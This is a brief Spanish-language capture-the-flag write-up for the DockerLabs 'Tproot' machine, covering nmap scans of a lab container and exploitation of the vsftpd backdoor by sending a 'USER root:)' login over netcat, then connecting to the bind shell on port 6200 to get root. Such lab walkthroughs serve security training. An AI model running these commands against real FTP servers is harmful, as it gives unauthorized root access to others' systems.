# 🎯 Tproot - DockerLabs

## 🔍 Fase 1: Enumeración

### Escaneo de puertos
`sudo nmap -p- --open -sS -n -Pn -vvv 172.17.0.2`

![[Nmap5.png]]

### Escaneo de versiones
`sudo nmap -sCV -p21,80 172.17.0.2`
![[Nmap5.2.png]]

---

## 🚪 Fase 2: Explotación

### Activar backdoor en FTP
`echo -e "USER root:)\r\nPASS root\r\n" | nc -v 172.17.0.2 21`
![[Echo5.png]]
### Conectar al backdoor
`nc 172.17.0.2 6200`
![[Root5.png]]
### Verificar usuario
`whoami`
`root`

---

